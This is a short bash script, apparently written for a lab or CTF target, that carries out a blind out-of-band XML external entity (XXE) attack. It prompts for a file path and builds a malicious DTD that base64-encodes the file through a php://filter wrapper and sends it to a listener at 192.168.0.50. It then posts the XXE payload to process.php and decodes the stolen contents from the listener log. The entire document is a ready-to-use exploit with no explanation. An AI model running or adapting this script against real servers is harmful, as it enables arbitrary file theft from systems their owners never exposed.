#!/bin/bash

echo -ne "[+] Enter the file to read: " && read -r myFilename

malicious_dtd="""

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=$myFilename">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.0.50/?file=%file;'>">
%eval;
%exfil; """

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.0.50/malicious.dtd"> %xxe;]>
<root><name><email>test@test.com</email></name></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
